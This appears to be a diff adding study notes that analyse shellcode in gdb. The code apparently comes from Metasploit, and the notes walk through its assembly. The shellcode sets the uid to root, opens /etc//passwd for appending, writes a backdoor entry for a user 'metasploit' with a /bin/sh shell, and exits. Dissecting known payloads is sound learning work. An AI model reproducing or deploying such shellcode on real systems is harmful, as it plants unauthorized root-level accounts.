@@ -11,4 +11,66 @@ For some reason, libemu doesn't seem to show anything...
 Moving onto gdb analysis
 
 
+First syscall:
+Looks to be for 0x46 or setreuid16 or setreuid
+
+xor ecx,ecx
+mov ebx, ecx
+push 0x46
+pop eax
+int 0x80
+So, ecx is zeroed out. ecx is moved in ebx, making it 0x0 as well. 0x46 is pushed to the stack and then popped into eax, making eax 0x46. The interrupt is called, making the syscall for setreuid.
+EBX is used to pass the uid of 0. Basically, this is trying to set the uid to root. When this is done successfully, the returned value in eax is 0
+
+Next syscall:
+push 0x5
+pop eax
+This pops the value 0x5 into eax
+
+xor ecx,ecx
+push ecx
+Zeroes out ecx and pushes it onto the stack, likely to null terminate a string
+
+push 0x64777373
+push 0x61702f2f
+push 0x6374652f
+This pushes the string "/etc//passwd" onto the stack.
+
+mov ebx, esp
+Moves the memory address of the top of stack into ebx. This is so ebx stores the address pointing to the string "/etc//passwd"
+
+inc ecx
+mov ch, 0x4
+This will set the ECX register to 0x401, or 1025 in decimal
+
+The syscall is then made for sys_open. The registers are as follows
+eax 0x5
+ebx pointer to string for "/etc//passwd"
+ecx 0x401
+This will open the file "/etc//passwd" and set the flags to "401" allowing for the file to be appended to.
+
+After this syscall, the file descriptor is returned in eax. For this, it is 0x3
+
+xchg ebx,eax
+This swaps the values stored in ebx and eax. EBX now stores 0x3 (the file descriptor) and EAX stores the memory pointer to the "/etc//passwd" string
+
+call 0x804a093 <code+83>
+This calls the above memory location, which is apparently the instruction "pop ecx". ECX's value becomes 0x804a06b, which is the memory address of the instruction right after the call. When you inspect this memory address, it appears to contain what looks like a /etc/passwd entry for a user metasploit that has a shell of /bin/sh
+
+This kind of creates a "new" set of instructions to run, shown here:
+   0x804a093 <code+83>:	pop    ecx
+=> 0x804a094 <code+84>:	mov    edx,DWORD PTR [ecx-0x4]
+   0x804a097 <code+87>:	push   0x4
+   0x804a099 <code+89>:	pop    eax
+   0x804a09a <code+90>:	int    0x80
+This is setting up the "write" syscall with EAX as 0x4. EBX contains the value 0x3, which is the file descriptor after opening "/etc//passwd". ECX is a memory pointer to the string that will be written. EDX has the value stored at ecx-0x4, or 0x804a067, moved into it, which is 0x28 and will be length of the string to be written
+
+   0x804a09c <code+92>:	push   0x1
+   0x804a09e <code+94>:	pop    eax
+   0x804a09f <code+95>:	int    0x80
+This sets up the system exit
+
+
+
+
 
